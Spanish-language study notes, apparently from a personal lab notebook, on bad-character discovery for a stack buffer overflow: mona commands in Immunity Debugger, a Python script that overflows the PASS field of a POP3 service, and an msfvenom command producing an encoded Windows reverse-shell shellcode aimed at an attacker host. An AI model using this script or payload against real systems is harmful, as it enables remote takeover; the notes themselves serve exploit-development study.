
que son los bytearrays
que son los badchars


---

la idea es generar un bytearray con el objetivo de ir descartando aquellos que el programa detecte como badchars

la idea es correr el bytearray en la pila y ver que caracteer no sale representado en ella. y cuando falte uno significa que ese es badchar, poruqe luego el programa se rompe y hay que reiniciar de nuevo por eso hay que iterar cada vez que el programa se encuentre con un badchar hay que regenerear el bytearray

crear un byte array con inmunity debugger y [[mona (python)]]

en [[Inmunnity Debugger]] con mona.py puedes crearlo de la siguiente manera

creamos eel directorio de trabajo con 
!mona config -set workingfolder "ruta"

luego 
!mona bytearray

luego podemos empezar a quitar caracteres que sean badchars
generalmente el byte "\x00" es como un fin de cadena por lo cual siempre genera error por badchar (el programa lo detecta como badchar) por lo que la idea es quitarlo del bytearray

para eso o puedes quitarlo borrandolo o regenerando con mona de la siguiente manera

!mona bytearray -cpb "\x00"


luego eso lo transferimos a la maquina atacante. si estamos en windows y queremos pasarlo por la maquina atacante una de las formas es 
[[SMB - Transferencia de archivos por SMB]]


luego deberias llevar el bytearray al codigo y tener algo asi

```python
import socket
import sys
IP_ADDRESS = "192.168.1.5"  # < --  IP de la victima
PORT =  110               # < --  puerto del servicio
offset = 2606
before_eip = b"A" * 2606
eip = b"B" * 4
after_eip = (b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23"
b"\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23\x23") # <- ESP - stack pointer

payload = before_eip + eip + after_eip

def exploit():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # nos conectamos a la victima
    s.connect((IP_ADDRESS, PORT))
    banner = s.recv(1024)
    print(f"[+] Banner: {banner}")
    s.send(b"USER test\r\n")
    response = s.recv(1024)
    print(f"[+] Response: {response}")
    s.send(b"PASS " + payload + b"\r\n")
    s.close()
if __name__ == '__main__':
    if len(sys.argv) == 3:
        IP_ADDRESS = sys.argv[1]
        PORT = int(sys.argv[2])
        print(f"\n[!] Uso: python {sys.argv[0]} <IP>")
        exit(1)
```

luego ejecutas el script y revisas el inmunity debugger  en la ventana c, abajo a la izquierda se ve 

![[Pasted image 20251025214019.png]]

esta en la segunda fila 09 y salta a 29.  por lo que falta el 0a (este caso tiene un bytearray generado, el del script de antes puse cosas de ejemplo)

para comparar tambien puedes usar mona

!mona compare -a 0x(dir ESP) -f C:\directorio\al\bytearray.bin

ahi te va a aparecer el badchar que salio mal. por lo que resta es generar de nuevo con mona o simplemente borrando en el script 

!mona bytearray -cpb "\x00\x0a"

y se sigue haciendo esto hasta que verifiques que estan todos  los bytearrays o simplemente moana compare no te de un badchar


esto se hace para usar luego [[msfvenom]] (de la suite de metasploit) para generear el shellcode con los bytearrays correctos

tenemos entoces los badchars que son
`\x00\x0a\x0d`

por lo queq con msfvenom creariamos el shellcode de la siguiente manera

```sh
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=ip_atacante LPORT=443 -f py -e x86/shikata_ga_nai -b '\x00\x0a\x0d' EXITFUNC=thread
``` 

- -p especificamos el payload
- --platform especificamos el SO
- -a es para la arquitectura
- LHOST es la ip a donde redirige la consola
- LPORT es el puerto de la maquina atacante
- -f es el tipo de salida en este caso para un script en python
- -e es el encoder en este caso ocupa shikata ga nai como encoder para tema de evasion de antivirus y demas
- -b son los badchars que debe excluir en el shellcod
- EXITFUNC es para que el exploit dependa de un proceso hijo y no se rompa el servicio una vez terminado (o algo asi)

